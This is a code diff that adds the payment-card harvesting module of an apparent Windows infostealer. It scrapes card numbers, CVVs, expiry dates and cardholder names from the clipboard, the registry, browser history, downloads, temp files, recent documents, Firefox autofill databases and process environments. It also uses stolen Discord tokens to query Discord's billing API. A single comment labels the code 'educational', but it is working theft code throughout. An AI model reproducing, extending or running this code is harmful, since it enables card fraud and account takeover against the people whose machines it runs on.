+                 OR name LIKE '%phone%' OR name LIKE '%zip%' OR name LIKE '%city%'
+                 OR name LIKE '%state%' OR name LIKE '%country%')
+            LIMIT 20
+        """, (origin, date_created))
+        
+        for name, value in cursor.fetchall():
+            if value and len(value.strip()) > 0:
+                context[name] = value[:100]  # Limit length
+        
+        return context
+        
+    except Exception:
+        return {}
+
+def extract_clipboard_credit_cards_enhanced():
+    """Enhanced clipboard extraction with history and pattern analysis"""
+    try:
+        cards = []
+        
+        # Current clipboard
+        try:
+            import win32clipboard
+            win32clipboard.OpenClipboard()
+            try:
+                clipboard_data = win32clipboard.GetClipboardData()
+                if clipboard_data and isinstance(clipboard_data, str):
+                    cards.extend(find_credit_cards_in_text(clipboard_data, 'Current Clipboard'))
+            except:
+                pass
+            finally:
+                win32clipboard.CloseClipboard()
+        except ImportError:
+            pass
+        
+        # Clipboard history from registry (Windows 10+ clipboard history)
+        try:
+            import winreg
+            clipboard_key_path = r"SOFTWARE\Microsoft\Clipboard"
+            try:
+                with winreg.OpenKey(winreg.HKEY_CURRENT_USER, clipboard_key_path) as key:
+                    i = 0
+                    while True:
+                        try:
+                            value_name, value_data, value_type = winreg.EnumValue(key, i)
+                            if isinstance(value_data, str) and len(value_data) > 10:
+                                cards.extend(find_credit_cards_in_text(value_data, f'Clipboard History - {value_name}'))
+                            i += 1
+                        except OSError:
+                            break
+            except Exception:
+                pass
+        except Exception:
+            pass
+        
+        return cards
+        
+    except Exception as e:
+        print(f"💳 Enhanced clipboard extraction error: {e}")
+        return []
+
+def find_credit_cards_in_text(text, source):
+    """Enhanced credit card pattern finding with better validation"""
+    try:
+        cards = []
+        
+        # Enhanced credit card patterns with more variations
+        patterns = [
+            r'\b(?:\d{4}[-\s]?){3}\d{4}\b',      # Standard format: 1234-5678-9012-3456
+            r'\b\d{16}\b',                         # No spaces: 1234567890123456
+            r'\b\d{4}\s\d{4}\s\d{4}\s\d{4}\b',   # Space separated: 1234 5678 9012 3456
+            r'\b\d{4}-\d{4}-\d{4}-\d{4}\b',       # Dash separated: 1234-5678-9012-3456
+            r'\b\d{4}\.\d{4}\.\d{4}\.\d{4}\b',   # Dot separated: 1234.5678.9012.3456
+            r'\b\d{4}/\d{4}/\d{4}/\d{4}\b',      # Slash separated: 1234/5678/9012/3456
+            r'\b\d{13,19}\b',                      # Any 13-19 digit number
+            r'(?:\d{4}\s?){3,4}\d{1,4}',          # Flexible spacing and length
+            r'card[:\s]*(\d{4}[-\s]?\d{4}[-\s]?\d{4}[-\s]?\d{4})',  # With "card" prefix
+            r'number[:\s]*(\d{4}[-\s]?\d{4}[-\s]?\d{4}[-\s]?\d{4})', # With "number" prefix
+        ]
+        
+        found_cards = set()  # Use set to avoid immediate duplicates
+        
+        for pattern in patterns:
+            matches = re.findall(pattern, text, re.IGNORECASE)
+            for match in matches:
+                # Clean the match (remove spaces, dashes, etc.)
+                if isinstance(match, tuple):
+                    match = match[0] if match else ''
+                
+                clean_card = re.sub(r'[-\s\./]', '', str(match))
+                
+                if clean_card and len(clean_card) >= 13:
+                    found_cards.add(clean_card)
+        
+        # Validate each found card
+        for card_number in found_cards:
+            if validate_credit_card_enhanced(card_number):
+                # Try to extract additional context around the card number
+                context = extract_card_context(text, card_number)
+                
+                cards.append({
+                    'card_number': card_number,
+                    'source': source,
+                    'context': context,
+                    'issuer': determine_card_issuer(card_number),
+                    'text_length': len(text),
+                    'extraction_method': 'pattern_matching'
+                })
+        
+        return cards
+        
+    except Exception as e:
+        print(f"💳 Enhanced pattern finding error: {e}")
+        return []
+
+def extract_card_context(text, card_number):
+    """Extract context around a found credit card number"""
+    try:
+        # Find the position of the card number in text
+        card_pos = text.find(card_number.replace(' ', '').replace('-', ''))
+        if card_pos == -1:
+            # Try with original formatting
+            formatted_patterns = [
+                f"{card_number[:4]} {card_number[4:8]} {card_number[8:12]} {card_number[12:]}",
+                f"{card_number[:4]}-{card_number[4:8]}-{card_number[8:12]}-{card_number[12:]}",
+                f"{card_number[:4]}.{card_number[4:8]}.{card_number[8:12]}.{card_number[12:]}"
+            ]
+            for pattern in formatted_patterns:
+                card_pos = text.find(pattern)
+                if card_pos != -1:
+                    break
+        
+        if card_pos != -1:
+            # Extract 200 characters before and after the card number
+            start_pos = max(0, card_pos - 200)
+            end_pos = min(len(text), card_pos + 200)
+            context = text[start_pos:end_pos]
+            
+            # Look for related information in the context
+            context_info = {}
+            
+            # Look for names
+            name_patterns = [
+                r'name[:\s]*([a-zA-Z\s]{2,30})',
+                r'cardholder[:\s]*([a-zA-Z\s]{2,30})',
+                r'holder[:\s]*([a-zA-Z\s]{2,30})'
+            ]
+            for pattern in name_patterns:
+                match = re.search(pattern, context, re.IGNORECASE)
+                if match:
+                    context_info['name'] = match.group(1).strip()
+                    break
+            
+            # Look for expiration dates
+            exp_patterns = [
+                r'exp[iry]*[:\s]*(\d{1,2})[/\-](\d{2,4})',
+                r'(\d{1,2})[/\-](\d{2,4})',
+                r'month[:\s]*(\d{1,2}).*year[:\s]*(\d{2,4})'
+            ]
+            for pattern in exp_patterns:
+                match = re.search(pattern, context, re.IGNORECASE)
+                if match:
+                    month, year = match.groups()
+                    context_info['exp_month'] = month
+                    context_info['exp_year'] = year
+                    break
+            
+            # Look for CVV
+            cvv_patterns = [
+                r'cv[cv][:\s]*(\d{3,4})',
+                r'security[:\s]*(\d{3,4})',
+                r'code[:\s]*(\d{3,4})'
+            ]
+            for pattern in cvv_patterns:
+                match = re.search(pattern, context, re.IGNORECASE)
+                if match:
+                    context_info['cvv'] = match.group(1)
+                    break
+            
+            return context_info
+            
+        return {}
+        
+    except Exception:
+        return {}
+
+def validate_and_deduplicate_cards_enhanced(all_cards):
+    """Enhanced validation and deduplication with better algorithms"""
+    try:
+        validated_cards = []
+        seen_cards = set()
+        card_fingerprints = set()  # For fuzzy duplicate detection
+        
+        for category, cards in all_cards.items():
+            print(f"💳 Processing {len(cards)} cards from {category}")
+            
+            for card in cards:
+                try:
+                    card_num = card.get('card_number')
+                    if not card_num:
+                        continue
+                    
+                    # Clean card number for comparison
+                    clean_card = re.sub(r'\D', '', str(card_num))
+                    
+                    # Skip if we've already seen this exact card
+                    if clean_card in seen_cards:
+                        continue
+                    
+                    # Create card fingerprint for fuzzy duplicate detection
+                    # (first 6 digits + last 4 digits + expiry)
+                    if len(clean_card) >= 10:
+                        fingerprint = clean_card[:6] + clean_card[-4:]
+                        if card.get('exp_month') and card.get('exp_year'):
+                            fingerprint += f"{card['exp_month']}{card['exp_year']}"
+                        
+                        if fingerprint in card_fingerprints:
+                            continue  # Skip likely duplicate
+                        card_fingerprints.add(fingerprint)
+                    
+                    # Enhanced validation
+                    if validate_credit_card_enhanced(clean_card):
+                        # Add issuer information
+                        card['issuer'] = determine_card_issuer(clean_card)
+                        card['card_length'] = len(clean_card)
+                        card['validation_score'] = calculate_card_validation_score(card)
+                        
+                        validated_cards.append(card)
+                        seen_cards.add(clean_card)
+                        
+                except Exception as card_error:
+                    print(f"💳 Error validating card: {str(card_error)}")
+                    continue
+        
+        # Sort by validation score (highest first)
+        validated_cards.sort(key=lambda x: x.get('validation_score', 0), reverse=True)
+        
+        print(f"💳 Enhanced validation complete: {len(validated_cards)} unique valid cards")
+        return validated_cards
+        
+    except Exception as e:
+        print(f"💳 Enhanced validation and deduplication error: {e}")
+        return []
+
+def calculate_card_validation_score(card):
+    """Calculate a validation score for credit card quality"""
+    try:
+        score = 0
+        
+        # Base score for having a valid card number
+        if card.get('card_number'):
+            score += 10
+        
+        # Bonus for having cardholder name
+        if card.get('name') or card.get('cardholder_name'):
+            score += 5
+        
+        # Bonus for having expiration date
+        if card.get('exp_month') and card.get('exp_year'):
+            score += 5
+        
+        # Bonus for having CVV
+        if card.get('cvv'):
+            score += 3
+        
+        # Bonus for having billing information
+        if card.get('billing_info'):
+            score += 7
+        
+        # Bonus for recent usage
+        if card.get('use_count') and card['use_count'] > 0:
+            score += 2
+        
+        # Bonus for known good issuers
+        issuer = card.get('issuer', '').lower()
+        if issuer in ['visa', 'mastercard', 'american express']:
+            score += 3
+        
+        # Bonus for being from saved payment methods (more reliable)
+        if 'saved' in card.get('source', ''):
+            score += 5
+        
+        return score
+        
+    except Exception:
+        return 0
+
+def extract_file_credit_cards_enhanced():
+    """Enhanced file extraction with more locations and better scanning"""
+    try:
+        cards = []
+        
+        # Comprehensive file search locations
+        search_locations = [
+            # Wallet and payment software paths
+            os.path.join(os.getenv('APPDATA'), 'PayPal'),
+            os.path.join(os.getenv('APPDATA'), 'Apple Pay'),
+            os.path.join(os.getenv('APPDATA'), 'Google Pay'),
+            os.path.join(os.getenv('APPDATA'), 'Samsung Pay'),
+            os.path.join(os.getenv('APPDATA'), 'Microsoft Wallet'),
+            os.path.join(os.getenv('APPDATA'), 'Amazon Pay'),
+            os.path.join(os.getenv('LOCALAPPDATA'), 'PayPal'),
+            os.path.join(os.getenv('LOCALAPPDATA'), 'Stripe'),
+            os.path.join(os.getenv('LOCALAPPDATA'), 'Square'),
+            
+            # Common document locations
+            os.path.expanduser("~/Desktop"),
+            os.path.expanduser("~/Documents"),
+            os.path.expanduser("~/Downloads"),
+            os.path.join(os.getenv('USERPROFILE'), 'OneDrive'),
+            
+            # Temporary and cache locations
+            os.getenv('TEMP'),
+            os.getenv('TMP'),
+            os.path.join(os.getenv('LOCALAPPDATA'), 'Temp'),
+            
+            # Browser profile folders (for exported data)
+            os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome', 'User Data'),
+            os.path.join(os.getenv('LOCALAPPDATA'), 'Microsoft', 'Edge', 'User Data'),
+        ]
+        
+        # Enhanced file types to scan
+        target_extensions = [
+            '.txt', '.csv', '.json', '.xml', '.dat', '.log', '.bak',
+            '.pdf', '.doc', '.docx', '.xls', '.xlsx', '.rtf',
+            '.sqlite', '.db', '.sql', '.config', '.ini', '.conf'
+        ]
+        
+        for location in search_locations:
+            if os.path.exists(location):
+                cards.extend(scan_directory_for_cards_enhanced(location, target_extensions))
+        
+        return cards
+        
+    except Exception as e:
+        print(f"💳 Enhanced file extraction error: {e}")
+        return []
+
+def scan_directory_for_cards_enhanced(directory, target_extensions):
+    """Enhanced directory scanning with better file type handling"""
+    try:
+        cards = []
+        
+        for root, dirs, files in os.walk(directory):
+            # Skip system and protected directories
+            skip_dirs = ['system32', 'windows', 'program files', '$recycle.bin', 'system volume information']
+            if any(skip_dir in root.lower() for skip_dir in skip_dirs):
+                continue
+            
+            for file in files:
+                if any(file.lower().endswith(ext) for ext in target_extensions):
+                    file_path = os.path.join(root, file)
+                    
+                    # Skip very large files (>10MB) for performance
+                    try:
+                        if os.path.getsize(file_path) > 10 * 1024 * 1024:
+                            continue
+                    except:
+                        continue
+                    
+                    try:
+                        # Enhanced file reading with multiple encodings
+                        content = None
+                        encodings = ['utf-8', 'utf-16', 'latin-1', 'cp1252']
+                        
+                        for encoding in encodings:
+                            try:
+                                with open(file_path, 'r', encoding=encoding, errors='ignore') as f:
+                                    content = f.read()
+                                break
+                            except:
+                                continue
+                        
+                        if content:
+                            found_cards = find_credit_cards_in_text(content, f'File - {file}')
+                            for card_info in found_cards:
+                                card_info['file_path'] = file_path
+                                card_info['file_name'] = file
+                                card_info['file_size'] = os.path.getsize(file_path)
+                                cards.append(card_info)
+                                
+                    except Exception as file_error:
+                        print(f"💳 Error scanning file {file}: {str(file_error)}")
+                        continue
+        
+        return cards
+        
+    except Exception as e:
+        print(f"💳 Enhanced directory scan error: {e}")
+        return []
+
+def extract_registry_credit_cards_enhanced():
+    """Enhanced registry extraction with more comprehensive key scanning"""
+    try:
+        cards = []
+        
+        # Comprehensive registry keys where payment data might be stored
+        registry_locations = [
+            # Internet Explorer/Edge legacy
+            (winreg.HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings"),
+            (winreg.HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Internet Explorer\Main"),
+            (winreg.HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Internet Explorer\IntelliForms\Storage2"),
+            
+            # Windows Store payment data
+            (winreg.HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Store"),
+            (winreg.HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Store\Licensing"),
+            
+            # Windows Wallet
+            (winreg.HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Wallet"),
+            (winreg.HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Wallet"),
+            
+            # Application payment caches
+            (winreg.HKEY_CURRENT_USER, r"SOFTWARE\PayPal"),
+            (winreg.HKEY_CURRENT_USER, r"SOFTWARE\Amazon"),
+            (winreg.HKEY_CURRENT_USER, r"SOFTWARE\eBay"),
+            (winreg.HKEY_CURRENT_USER, r"SOFTWARE\Stripe"),
+            
+            # Browser-specific registry entries
+            (winreg.HKEY_CURRENT_USER, r"SOFTWARE\Google\Chrome\PreferenceMACs"),
+            (winreg.HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Edge\PreferenceMACs"),
+        ]
+        
+        for hkey, key_path in registry_locations:
+            try:
+                with winreg.OpenKey(hkey, key_path) as key:
+                    # Enumerate all values in this key
+                    i = 0
+                    while True:
+                        try:
+                            value_name, value_data, value_type = winreg.EnumValue(key, i)
+                            
+                            if isinstance(value_data, str) and len(value_data) > 10:
+                                found_cards = find_credit_cards_in_text(value_data, f'Registry - {key_path}')
+                                for card_info in found_cards:
+                                    card_info['registry_key'] = key_path
+                                    card_info['value_name'] = value_name
+                                    cards.append(card_info)
+                            
+                            i += 1
+                        except OSError:
+                            break
+                        except Exception:
+                            i += 1
+                            continue
+                            
+            except Exception as key_error:
+                print(f"💳 Error accessing registry key {key_path}: {str(key_error)}")
+                continue
+        
+        return cards
+        
+    except Exception as e:
+        print(f"💳 Enhanced registry extraction error: {e}")
+        return []
+
+def extract_memory_credit_cards_enhanced():
+    """Enhanced memory extraction with better process targeting"""
+    try:
+        cards = []
+        
+        # Enhanced target processes that might contain payment data
+        target_processes = [
+            # Browsers
+            'chrome.exe', 'firefox.exe', 'msedge.exe', 'opera.exe', 'brave.exe',
+            'vivaldi.exe', 'arc.exe', 'yandex.exe', 'safari.exe',
+            
+            # Payment applications
+            'paypal.exe', 'amazon.exe', 'ebay.exe', 'stripe.exe', 'square.exe',
+            'venmo.exe', 'cashapp.exe', 'zelle.exe', 'applepay.exe',
+            
+            # Financial software
+            'quickbooks.exe', 'quicken.exe', 'mint.exe', 'turbotax.exe',
+            'hrblock.exe', 'bankofamerica.exe', 'chase.exe', 'wellsfargo.exe',
+            
+            # E-commerce
+            'shopify.exe', 'woocommerce.exe', 'magento.exe', 'prestashop.exe',
+            
+            # Crypto wallets
+            'exodus.exe', 'electrum.exe', 'metamask.exe', 'coinbase.exe'
+        ]
+        
+        for proc in psutil.process_iter(['pid', 'name', 'memory_info', 'cmdline']):
+            try:
+                proc_name = proc.info['name'].lower()
+                
+                if any(target in proc_name for target in target_processes):
+                    # Enhanced memory scanning approach
+                    try:
+                        # Get process command line for token/data scanning
+                        cmdline = proc.info.get('cmdline', [])
+                        if cmdline:
+                            cmdline_text = ' '.join(cmdline)
+                            found_cards = find_credit_cards_in_text(cmdline_text, f'Memory - {proc_name} cmdline')
+                            cards.extend(found_cards)
+                        
+                        # Get process environment variables (if accessible)
+                        try:
+                            environ = proc.environ() if hasattr(proc, 'environ') else {}
+                            for env_name, env_value in environ.items():
+                                if any(keyword in env_name.lower() for keyword in ['payment', 'card', 'billing', 'stripe', 'paypal']):
+                                    found_cards = find_credit_cards_in_text(env_value, f'Memory - {proc_name} env')
+                                    cards.extend(found_cards)
+                        except (psutil.AccessDenied, psutil.NoSuchProcess):
+                            pass
+                        
+                        # Note: Real memory scanning would require more advanced techniques
+                        # This is a simplified approach for educational purposes
+                        
+                    except (psutil.AccessDenied, psutil.NoSuchProcess):
+                        continue
+                    except Exception as proc_error:
+                        print(f"💳 Error scanning process {proc_name}: {str(proc_error)}")
+                        continue
+                        
+            except Exception:
+                continue
+        
+        return cards
+        
+    except Exception as e:
+        print(f"💳 Enhanced memory extraction error: {e}")
+        return []
+
+def extract_credit_cards_from_history():
+    """NEW: Extract credit cards from browser history (payment URLs and cached data)"""
+    try:
+        cards = []
+        
+        # Browser history databases
+        history_paths = [
+            ('Chrome', os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome', 'User Data', 'Default', 'History')),
+            ('Edge', os.path.join(os.getenv('LOCALAPPDATA'), 'Microsoft', 'Edge', 'User Data', 'Default', 'History')),
+            ('Brave', os.path.join(os.getenv('LOCALAPPDATA'), 'BraveSoftware', 'Brave-Browser', 'User Data', 'Default', 'History')),
+            ('Opera', os.path.join(os.getenv('APPDATA'), 'Opera Software', 'Opera Stable', 'History')),
+        ]
+        
+        # Payment-related URL patterns to look for
+        payment_url_patterns = [
+            'stripe.com', 'paypal.com', 'checkout', 'payment', 'billing',
+            'card', 'credit', 'purchase', 'buy', 'order', 'cart'
+        ]
+        
+        for browser_name, history_path in history_paths:
+            if not os.path.exists(history_path):
+                continue
+                
+            try:
+                temp_db = tempfile.mktemp(suffix='.db')
+                shutil.copy2(history_path, temp_db)
+                
+                conn = sqlite3.connect(temp_db)
+                cursor = conn.cursor()
+                
+                # Look for payment-related URLs in history
+                for pattern in payment_url_patterns:
+                    try:
+                        cursor.execute("""
+                            SELECT url, title, visit_count, last_visit_time
+                            FROM urls
+                            WHERE url LIKE ? OR title LIKE ?
+                            ORDER BY last_visit_time DESC
+                            LIMIT 100
+                        """, (f'%{pattern}%', f'%{pattern}%'))
+                        
+                        for row in cursor.fetchall():
+                            url, title, visit_count, last_visit_time = row
+                            
+                            # Look for credit card patterns in URL parameters
+                            if '?' in url:
+                                url_params = url.split('?')[1]
+                                found_cards = find_credit_cards_in_text(url_params, f'{browser_name} History URL')
+                                for card_info in found_cards:
+                                    card_info['url'] = url
+                                    card_info['title'] = title
+                                    card_info['visit_count'] = visit_count
+                                    card_info['last_visit'] = last_visit_time
+                                    cards.append(card_info)
+                            
+                            # Look for credit card patterns in page title
+                            if title:
+                                found_cards = find_credit_cards_in_text(title, f'{browser_name} History Title')
+                                for card_info in found_cards:
+                                    card_info['url'] = url
+                                    card_info['title'] = title
+                                    cards.append(card_info)
+                                    
+                    except Exception:
+                        continue
+                
+                conn.close()
+                os.unlink(temp_db)
+                
+            except Exception as browser_error:
+                print(f"💳 Error scanning {browser_name} history: {str(browser_error)}")
+                continue
+        
+        return cards
+        
+    except Exception as e:
+        print(f"💳 History extraction error: {e}")
+        return []
+
+def extract_credit_cards_from_downloads():
+    """NEW: Extract credit cards from browser downloads (payment receipts, invoices, etc.)"""
+    try:
+        cards = []
+        
+        # Browser download databases
+        download_paths = [
+            ('Chrome', os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome', 'User Data', 'Default', 'History')),
+            ('Edge', os.path.join(os.getenv('LOCALAPPDATA'), 'Microsoft', 'Edge', 'User Data', 'Default', 'History')),
+            ('Brave', os.path.join(os.getenv('LOCALAPPDATA'), 'BraveSoftware', 'Brave-Browser', 'User Data', 'Default', 'History')),
+        ]
+        
+        for browser_name, history_path in download_paths:
+            if not os.path.exists(history_path):
+                continue
+                
+            try:
+                temp_db = tempfile.mktemp(suffix='.db')
+                shutil.copy2(history_path, temp_db)
+                
+                conn = sqlite3.connect(temp_db)
+                cursor = conn.cursor()
+                
+                # Get download history
+                cursor.execute("""
+                    SELECT target_path, tab_url, total_bytes, start_time, end_time
+                    FROM downloads
+                    WHERE target_path IS NOT NULL
+                    ORDER BY start_time DESC
+                    LIMIT 200
+                """)
+                
+                for row in cursor.fetchall():
+                    target_path, tab_url, total_bytes, start_time, end_time = row
+                    
+                    # Check if downloaded file still exists and scan it
+                    if target_path and os.path.exists(target_path):
+                        try:
+                            # Only scan text-based files and small files
+                            if (target_path.lower().endswith(('.txt', '.csv', '.json', '.xml', '.pdf', '.doc')) 
+                                and os.path.getsize(target_path) < 5 * 1024 * 1024):  # < 5MB
+                                
+                                # Try to read the downloaded file
+                                try:
+                                    with open(target_path, 'r', encoding='utf-8', errors='ignore') as f:
+                                        content = f.read()
+                                    
+                                    found_cards = find_credit_cards_in_text(content, f'{browser_name} Download')
+                                    for card_info in found_cards:
+                                        card_info['download_path'] = target_path
+                                        card_info['download_url'] = tab_url
+                                        card_info['download_size'] = total_bytes
+                                        card_info['download_time'] = start_time
+                                        cards.append(card_info)
+                                        
+                                except Exception:
+                                    pass
+                                    
+                        except Exception:
+                            continue
+                
+                conn.close()
+                os.unlink(temp_db)
+                
+            except Exception as browser_error:
+                print(f"💳 Error scanning {browser_name} downloads: {str(browser_error)}")
+                continue
+        
+        return cards
+        
+    except Exception as e:
+        print(f"💳 Downloads extraction error: {e}")
+        return []
+
+def extract_discord_payment_cards():
+    """NEW: Extract credit cards from Discord payment data using injection and API"""
+    try:
+        cards = []
+        
+        # Get Discord tokens first
+        discord_tokens = steal_discord_tokens()
+        
+        for token in discord_tokens:
+            try:
+                headers = {'Authorization': token, 'Content-Type': 'application/json'}
+                
+                # Get billing information from Discord API
+                billing_response = requests.get('https://discord.com/api/v9/users/@me/billing/payment-sources', 
+                                              headers=headers, timeout=10)
+                
+                if billing_response.status_code == 200:
+                    billing_data = billing_response.json()
+                    
+                    for payment_source in billing_data:
+                        try:
+                            if payment_source.get('type') == 1:  # Credit card
+                                # Extract available card info (Discord doesn't give full numbers)
+                                card_info = {
+                                    'last_4': payment_source.get('last_4', 'Unknown'),
+                                    'brand': payment_source.get('brand', 'Unknown'),
+                                    'exp_month': payment_source.get('expires_month'),
+                                    'exp_year': payment_source.get('expires_year'),
+                                    'country': payment_source.get('country', 'Unknown'),
+                                    'source': 'discord_api',
+                                    'token_preview': token[:20] + '...',
+                                    'payment_source_id': payment_source.get('id'),
+                                    'is_default': payment_source.get('default', False)
+                                }
+                                cards.append(card_info)
+                                
+                        except Exception as payment_error:
+                            print(f"💳 Error processing Discord payment source: {str(payment_error)}")
+                            continue
+                            
+            except Exception as token_error:
+                print(f"💳 Error using Discord token: {str(token_error)}")
+                continue
+        
+        # Also check Discord injection logs for captured payment data
+        try:
+            injection_paths = [
+                os.path.expanduser("~/AppData/Roaming/Discord"),
+                os.path.expanduser("~/AppData/Local/Discord"),
+                "C:\\Windows\\Temp"
+            ]
+            
+            for injection_path in injection_paths:
+                if os.path.exists(injection_path):
+                    for root, dirs, files in os.walk(injection_path):
+                        for file in files:
+                            if 'payment' in file.lower() or 'card' in file.lower():
+                                try:
+                                    file_path = os.path.join(root, file)
+                                    with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
+                                        content = f.read()
+                                    
+                                    found_cards = find_credit_cards_in_text(content, f'Discord Injection - {file}')
+                                    cards.extend(found_cards)
+                                    
+                                except Exception:
+                                    continue
+        except Exception:
+            pass
+        
+        return cards
+        
+    except Exception as e:
+        print(f"💳 Discord payment extraction error: {e}")
+        return []
+
+def extract_credit_cards_from_temp_files():
+    """NEW: Extract credit cards from temporary files and caches"""
+    try:
+        cards = []
+        
+        # Temporary file locations
+        temp_locations = [
+            os.getenv('TEMP'),
+            os.getenv('TMP'),
+            os.path.join(os.getenv('LOCALAPPDATA'), 'Temp'),
+            os.path.join(os.getenv('WINDIR'), 'Temp'),
+            os.path.join(os.getenv('USERPROFILE'), 'AppData', 'Local', 'Temp'),
+            
+            # Browser cache locations
+            os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome', 'User Data', 'Default', 'Cache'),
+            os.path.join(os.getenv('LOCALAPPDATA'), 'Microsoft', 'Edge', 'User Data', 'Default', 'Cache'),
+            
+            # Application temp folders
+            os.path.join(os.getenv('APPDATA'), 'PayPal', 'temp'),
+            os.path.join(os.getenv('APPDATA'), 'Amazon', 'cache'),
+        ]
+        
+        for temp_location in temp_locations:
+            if not os.path.exists(temp_location):
+                continue
+                
+            try:
+                # Only scan recent files (last 7 days) for performance
+                cutoff_time = time.time() - (7 * 24 * 3600)
+                
+                for root, dirs, files in os.walk(temp_location):
+                    for file in files:
+                        file_path = os.path.join(root, file)
+                        
+                        try:
+                            # Check file modification time
+                            if os.path.getmtime(file_path) < cutoff_time:
+                                continue
+                            
+                            # Only scan small text files
+                            if (os.path.getsize(file_path) < 1024 * 1024  # < 1MB
+                                and any(file.lower().endswith(ext) for ext in ['.txt', '.log', '.tmp', '.cache', '.json'])):
+                                
+                                with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
+                                    content = f.read()
+                                
+                                found_cards = find_credit_cards_in_text(content, f'Temp File - {file}')
+                                for card_info in found_cards:
+                                    card_info['temp_file_path'] = file_path
+                                    card_info['file_modified'] = os.path.getmtime(file_path)
+                                    cards.append(card_info)
+                                    
+                        except Exception:
+                            continue
+                            
+            except Exception as location_error:
+                print(f"💳 Error scanning temp location {temp_location}: {str(location_error)}")
+                continue
+        
+        return cards
+        
+    except Exception as e:
+        print(f"💳 Temp files extraction error: {e}")
+        return []
+
+def extract_credit_cards_from_recent_docs():
+    """NEW: Extract credit cards from recent documents and files"""
+    try:
+        cards = []
+        
+        # Recent documents locations
+        recent_locations = [
+            os.path.expanduser("~/Recent"),
+            os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Recent'),
+            os.path.join(os.getenv('USERPROFILE'), 'Documents'),
+            os.path.join(os.getenv('USERPROFILE'), 'Desktop'),
+            os.path.join(os.getenv('USERPROFILE'), 'Downloads'),
+        ]
+        
+        # File types that might contain payment information
+        payment_file_patterns = [
+            '*receipt*', '*invoice*', '*payment*', '*billing*', '*order*',
+            '*purchase*', '*transaction*', '*card*', '*paypal*', '*stripe*'
+        ]
+        
+        for location in recent_locations:
+            if not os.path.exists(location):
+                continue
+                
+            try:
+                # Get recently modified files (last 30 days)
+                cutoff_time = time.time() - (30 * 24 * 3600)
+                
+                for root, dirs, files in os.walk(location):
+                    for file in files:
+                        # Check if filename suggests payment-related content
+                        if any(pattern.replace('*', '') in file.lower() for pattern in payment_file_patterns):
+                            file_path = os.path.join(root, file)
+                            
+                            try:
+                                # Check if file is recent
+                                if os.path.getmtime(file_path) < cutoff_time:
+                                    continue
+                                
+                                # Only scan reasonable file sizes
+                                if os.path.getsize(file_path) > 5 * 1024 * 1024:  # Skip files > 5MB
+                                    continue
+                                
+                                # Scan text-based files
+                                if file.lower().endswith(('.txt', '.csv', '.json', '.xml', '.rtf', '.doc', '.docx')):
+                                    try:
+                                        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
+                                            content = f.read()
+                                        
+                                        found_cards = find_credit_cards_in_text(content, f'Recent Doc - {file}')
+                                        for card_info in found_cards:
+                                            card_info['document_path'] = file_path
+                                            card_info['document_modified'] = os.path.getmtime(file_path)
+                                            cards.append(card_info)
+                                            
+                                    except Exception:
+                                        continue
+                                        
+                            except Exception:
+                                continue
+                                
+            except Exception as location_error:
+                print(f"💳 Error scanning recent docs location {location}: {str(location_error)}")
+                continue
+        
+        return cards
+        
+    except Exception as e:
+        print(f"💳 Recent docs extraction error: {e}")
+        return []
+
+def extract_firefox_autofill_cards_enhanced(profile_path):
+    """Enhanced Firefox autofill extraction with better data collection"""
+    try:
+        cards = []
+        
+        # Firefox stores autofill data in formhistory.sqlite
+        formhistory_path = os.path.join(profile_path, 'formhistory.sqlite')
+        if not os.path.exists(formhistory_path):
+            return cards
+        
+        temp_db = tempfile.mktemp(suffix='.db')
+        shutil.copy2(formhistory_path, temp_db)
+        
+        conn = sqlite3.connect(temp_db)
+        cursor = conn.cursor()
+        
+        # Enhanced query for Firefox form history
+        cursor.execute("""
+            SELECT fieldname, value, firstUsed, lastUsed, timesUsed
+            FROM moz_formhistory
+            WHERE (fieldname LIKE '%card%' OR fieldname LIKE '%credit%' OR fieldname LIKE '%payment%'
+                   OR fieldname LIKE '%cc%' OR fieldname LIKE '%cvv%' OR fieldname LIKE '%cvc%'
+                   OR fieldname LIKE '%number%' OR fieldname LIKE '%pan%')
+            AND value IS NOT NULL AND value != ''
+        """)
+        
+        for row in cursor.fetchall():
+            try:
+                fieldname, value, first_used, last_used, times_used = row
+                
+                if validate_credit_card_enhanced(value):
+                    cards.append({
+                        'card_number': value,
+                        'field_name': fieldname,
+                        'first_used': first_used,
+                        'last_used': last_used,
+                        'times_used': times_used,
+                        'source': 'firefox_autofill',
+                        'browser': 'Firefox',
+                        'profile_path': profile_path
+                    })
+            except Exception:
+                continue
+        
+        conn.close()
+        os.unlink(temp_db)
+        return cards
+        
+    except Exception as e:
+        print(f"💳 Enhanced Firefox autofill extraction error: {e}")
+        return []
+
+def extract_firefox_payment_methods_enhanced(profile_path):
+    """Enhanced Firefox payment methods extraction"""
+    try:
+        cards = []
+        
+        # Enhanced Firefox payment data files
+        payment_files = [
+            'payments.json', 'payment-methods.json', 'autofill.json',
+            'formautofill.sqlite', 'creditcards.sqlite'
+        ]
+        
+        for payment_file in payment_files:
+            file_path = os.path.join(profile_path, payment_file)
+            if os.path.exists(file_path):
+                try:
+                    if payment_file.endswith('.json'):
+                        # JSON files
+                        with open(file_path, 'r', encoding='utf-8') as f:
+                            data = json.load(f)
+                        
+                        # Recursively search JSON for credit card patterns
+                        cards.extend(extract_cards_from_json(data, f'Firefox {payment_file}'))
+                        
+                    elif payment_file.endswith('.sqlite'):
+                        # SQLite databases
+                        temp_db = tempfile.mktemp(suffix='.db')
+                        shutil.copy2(file_path, temp_db)
+                        
+                        conn = sqlite3.connect(temp_db)
+                        cursor = conn.cursor()
+                        
+                        # Get table names
+                        cursor.execute("SELECT name FROM sqlite_master WHERE type='table';")
+                        tables = [row[0] for row in cursor.fetchall()]
+                        
+                        for table in tables:
